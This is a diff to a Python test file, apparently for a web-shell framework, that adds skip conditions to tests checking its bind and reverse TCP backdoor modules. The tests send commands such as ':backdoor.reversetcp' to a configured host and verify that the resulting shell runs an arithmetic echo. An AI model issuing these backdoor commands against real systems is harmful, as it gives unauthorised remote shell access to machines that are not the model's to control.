@@ -1,14 +1,14 @@
 #from baseclasses import ExecTestCase
-import unittest, pexpect
-from baseclasses import conf
+import pexpect
 from random import randint
+from unittest import TestCase, skipIf
+from test import conf
 import sys, os
 sys.path.append(os.path.abspath('..'))
 from modules.backdoor.reversetcp import WARN_BINDING_SOCKET
 
-class Backdoors(unittest.TestCase):
-    
-    
+@skipIf(not conf['shell_sh'] or "false" in conf['shell_sh'].lower(), "Skipping shell.sh dependent tests")
+class Backdoors(TestCase):
     def setUp(self):
         
         self.ports = range(int(conf['backdoor_tcp_startport']), int(conf['backdoor_tcp_endport']))
@@ -26,9 +26,9 @@ class Backdoors(unittest.TestCase):
     def _check_oob_shell(self, cmd, testcmd, testresult):
         
         self.process.send(cmd)
-        
-        idx = self.process.expect(['\$', '.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
-        self.assertEqual(idx, 0, 'Error connecting to port: %s%s' % (self.process.before, self.process.after))
+
+        idx = self.process.expect(['\n','\$', '.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
+        self.assertNotEqual(idx, 2, 'Error connecting to port: %s%s' % (self.process.before, self.process.after))
         self.process.send(testcmd)
         
         idx = self.process.expect([str(testresult), pexpect.TIMEOUT, pexpect.EOF])
@@ -45,15 +45,17 @@ class Backdoors(unittest.TestCase):
         idx = self.process.expect([expectedmsg, '\$', '.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
         self.assertEqual(idx, 0, 'Error expecting error message: %s%s' % (self.process.before, self.process.after))
         
-        
+    @skipIf(not conf['backdoor_tcp_startport'] or not conf['backdoor_tcp_endport'], "Skipping backdoor direct connect")
     def test_tcp(self):
         testvalue = randint(1,100)*2
         self._check_oob_shell(':backdoor.tcp %i\r\n' % self.ports.pop(0), 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )
-        
+
+    @skipIf(not conf['backdoor_reverse_tcp_startport'] or not conf['backdoor_reverse_tcp_endport'] or not conf['backdoor_reverse_tcp_host'], "Skipping backdoor reverse connect")        
     def test_reverse_tcp(self):
         testvalue = randint(1,100)*2
         self._check_oob_shell(':backdoor.reversetcp %s\r\n' % conf['backdoor_reverse_tcp_host'], 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )
         
+    @skipIf(not conf['backdoor_reverse_tcp_startport'] or not conf['backdoor_reverse_tcp_endport'] or not conf['backdoor_reverse_tcp_host'], "Skipping backdoor reverse connect")        
     def test_reverse_tcp_error(self):
         self._check_oob_shell_errors(':backdoor.reversetcp %s -port 80\r\n' % conf['backdoor_reverse_tcp_host'],   WARN_BINDING_SOCKET)
-    
+        
